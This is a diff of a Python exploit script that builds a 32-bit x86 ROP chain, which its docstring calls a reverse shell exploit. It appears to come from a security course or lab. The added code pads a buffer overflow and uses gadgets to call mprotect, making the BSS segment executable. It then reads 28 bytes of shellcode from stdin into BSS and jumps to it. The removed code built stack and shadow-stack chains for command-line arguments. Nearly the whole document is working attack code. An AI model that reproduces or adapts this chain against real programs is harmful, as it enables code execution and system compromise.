@@ -1,3 +1,4 @@
+from address_pop import doubadd
 import junk_length_and_addresses
 import address_pop
 from struct import pack
@@ -27,79 +28,6 @@ POPEBX    = pack('<I', rop.get_gadget("pop ebx ; ret")) # pop ebx ; ret
 POPECXEBX = pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")) # pop ecx ; pop ebx ; ret
 
 
-def preprocess(p):
-    """Helper function to preprocess command line arguments w.r.t. /
-
-    :param p: The parameter to be preprocessed
-    :return: The preprocessed command line argument
-    """
-    if '/' in p:
-        result = ""
-        subargs = p.split('/')
-        for subarg in subargs:
-            if subarg:
-                while len(subarg) < 3:
-                    subarg = '/' + subarg
-                result += '/' + subarg
-        return result
-    return p
-
-
-def create_stack_ropchain(cli_args, base_address):
-    """Create the stack ROP chain
-
-    :param cli_args: The command line arguments
-    :param base_address: The base .data address
-    :return: The stack ROP chain packed bytes sequence
-    """
-    p = b''
-
-    offset = 0
-    size = len(cli_args)
-    for index in range(size):
-        if index > 0:
-            offset += len(cli_args[index - 1]) + 1
-        
-        for j in range(len(cli_args[index]) // 4):
-            p += address_pop.pop_reg(base_address + offset + j * 4,POPEDX,0,DECEDX,"dec")
-
-            p += POPEAX
-            p += (cli_args[index][j * 4 : (j + 1) * 4]).encode('utf-8')
-            p += MOVISTACK
-        
-        p += address_pop.pop_reg(base_address + offset + len(cli_args[index]),POPEDX,0,DECEDX,"dec")
-
-        p += XOREAX
-        p += MOVISTACK
-    
-    return p
-
-
-def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
-    """Create the shadow stack ROP chain
-
-    :param cli_args: The command line arguments
-    :param base_address: The base .data address
-    :param shadow_stack_offset: The offset used from the .data address to create the shadow stack
-    :return: The shadow stack ROP chain packed bytes sequence
-    """
-    p = b''
-
-    args_offset = 0
-    shadow_offset = 0
-    size = len(cli_args)
-    
-    for index in range(size):
-        p += address_pop.pop_reg(base_address + args_offset,POPEAX,POPEDX,ADDEAXEDX,"add")
-        p += address_pop.pop_reg(base_address + shadow_stack_offset + shadow_offset,POPEDX,0,DECEDX,"dec")
-        p += MOVISTACK
-
-        shadow_offset += 4
-        args_offset += len(cli_args[index]) + 1
-    
-    return p
-
-
 def rop_exploit(base_address):
     """Create the full ROP chain reverse shell exploit
 
@@ -108,27 +36,44 @@ def rop_exploit(base_address):
     :return: The full ROP chain reverse shell exploit packed bytes sequence
     """
     (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
-    data += 160 # now contains a null byte
-    print(f"{data:x}")
-    STACK     = pack('<I', data)
+    # We need to align the BSS with the page size
+    bss = (bss & 0xfffff000)
+    print(f"{bss:x}")
     exploit = b'\x41' * padding
 
     
-    
     exploit += address_pop.doubadd(0x0000007D,ADDECXECX,INCECX)
-    exploit += XOREAX # xor eax, eax ; ret
-    exploit += ADDEAXECX
-    exploit += address_pop.doubadd(0x00021000,ADDECXECX,INCECX)
-    exploit += address_pop.pop_reg(0xfffdd000,POPEBX,0,INCEBX,"inc")
+    exploit += XOREAX 
+    exploit += ADDEAXECX # syscall mprotect
+    exploit += address_pop.pop_reg(bss,POPEBX,0,INCEBX,"inc")
 
     exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
     exploit += INCEDX * 8
+    exploit += address_pop.doubadd(0x0000800,ADDECXECX,INCECX)
+    exploit += ADDECXECX
     exploit += INT80 # int 0x80
+
+
+    # BSS is now executable
+    # # Read into BSS
     exploit += XOREAX
-    exploit += INCEAX
+    exploit += INCEAX * 3 #Syscall Read
+    exploit += address_pop.pop_reg(bss,POPECXEBX,0,INCECX,"inc") #bss
+    exploit += INCECX # One of the incs is consumed by EBX
+    exploit += address_pop.pop_reg(0xffffffff,POPEBX,0,INCEBX,"inc")
+    exploit += INCEBX #stdin
+    
+
+    exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
+    # Read 28 bytes
+    exploit += INCEDX * 29 
     exploit += INT80
 
-    exploit += b'A' * 100
+
+    # We must jump to an offset of BSS as BSS contains null characters
+    exploit += pack('<I', bss + 4) 
+    exploit += b"A"*100
+
     return exploit
 
 
